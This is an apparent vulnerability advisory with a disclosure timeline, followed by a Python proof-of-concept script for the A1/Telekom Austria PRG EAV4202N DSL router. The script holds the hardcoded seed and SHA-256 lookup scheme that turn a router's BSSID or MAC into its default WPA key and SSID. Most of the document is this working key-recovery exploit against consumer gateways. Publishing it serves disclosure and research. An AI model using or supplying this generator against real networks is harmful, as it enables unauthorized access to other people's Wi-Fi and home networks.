'''
title:          A1/Telekom Austria PRG EAV4202N Default WPA Key Algorithm Weakness
product names:  PRG EAV4202N, PRGAV4202N, PRG 4202 N, P.RG AV4202N
device class:   802.11n DSL broadband gateway
vulnerable:     S/N PI101120401*
not vulnerable: S/N PI105220402* (?)
impact:         critical

product notes:
This device is manufactured by ADB Broadband (formerly Pirelli Broadband) and is rebranded for
A1 (formerly Telekom Austria). A Wi-Fi AP is enabled by default and can be accessed with the
default WPA-key printed on the back of the device.

vulnerability description:
The algorithm for the default WPA-key is entirely based on the internal MAC address (rg_mac).
rg_mac can either be derived from BSSID and SSID (if not changed) or BSSID alone.

timeline:
2010-11-20 working exploit
2010-12-04 informed Telekom Austria
2010-12-06 TA requests exploit code
2010-12-07 PoC sent
2010-12-09 TA starts analysis with ADB Broadband
2010-12-17 analysis finished
2010-12-20 vulnerability confirmed, will be fixed in next hardware(!) revision
...
2011-03-10 TA discloses vulnerability to press
2011-03-10 TA confirms that they will not inform affected customers directly
2011-12-04 grace period over

references:
http://broadband.adbglobal.com/medias/images/products/prg_av4202n/data_sheet_p_rg_av4202n.pdf
http://futurezone.at/produkte/2165-massives-sicherheitsproblem-bei-telekom-modems.php
http://help.orf.at/stories/1678161/
'''

import sys, re, hashlib

def gen_key(mac):
    seed = ('\x54\x45\x4F\x74\x65\x6C\xB6\xD9\x86\x96\x8D\x34\x45\xD2\x3B\x15' + 
            '\xCA\xAF\x12\x84\x02\xAC\x56\x00\x05\xCE\x20\x75\x94\x3F\xDC\xE8')
    lookup = '0123456789ABCDEFGHIKJLMNOPQRSTUVWXYZabcdefghikjlmnopqrstuvwxyz'

    h = hashlib.sha256()
    h.update(seed)
    h.update(mac)
    digest = bytearray(h.digest())
    return ''.join([lookup[x % len(lookup)] for x in digest[0:12]])

def main():
    print '*********************************************************************'
    print ' A1/Telekom Austria PRG EAV4202N Default WPA Key Algorithm Weakness'
    print '                 Stefan Viehboeck <@sviehb> 11.2010'
    print '*********************************************************************'

    if len(sys.argv) != 2:
        sys.exit('usage: pirelli_wpa.py [RG_MAC] or [BSSID]\n eg. pirelli_wpa.py 38229D112233\n')
        
    mac_str = re.sub(r'[^a-fA-F0-9]', '', sys.argv[1])
    if len(mac_str) != 12:
        sys.exit('check MAC format!\n')

    mac = bytearray.fromhex(mac_str)
    print 'based on rg_mac:\nSSID: PBS-%02X%02X%02X' % (mac[3], mac[4], mac[5])
    print 'WPA key: %s\n' % (gen_key(mac))
    
    mac[5] -= 5
    print 'based on BSSID:\nSSID: PBS-%02X%02X%02X' % (mac[3], mac[4], mac[5])
    print 'WPA key: %s\n' % (gen_key(mac))

if __name__ == "__main__":
    main()
